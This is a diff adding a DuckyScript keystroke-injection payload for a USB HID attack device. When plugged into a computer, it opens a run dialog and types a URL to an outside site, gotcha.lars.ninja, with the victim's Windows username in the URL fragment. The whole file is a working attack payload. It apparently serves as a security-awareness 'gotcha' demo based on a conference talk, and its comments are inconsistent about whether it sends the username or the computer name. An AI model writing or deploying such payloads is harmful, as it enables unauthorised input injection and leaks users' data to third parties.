@@ -1,0 +1,25 @@
+REM This payload opens up the website https://gotcha.lars.ninja and inserts
+REM the Computername into the url Fragment (https://gotcha.lars.ninja/#{USERNAME})
+REM this only works on windows.
+
+REM this script is inspired by the presentation of Darren Kitchen and
+REM Shannon Morse at AusCERT 2017.
+
+REM Start of with a delay to let the computer install drivers
+DELAY 1000
+
+REM Linux: ALT + F2
+ALT F2
+DELAY 50
+
+GUI SPACE
+DELAY 50
+
+GUI r
+DELAY 50
+
+BACKSPACE
+DELAY 100
+
+STRING https://gotcha.lars.ninja/#%USERNAME%
+ENTER
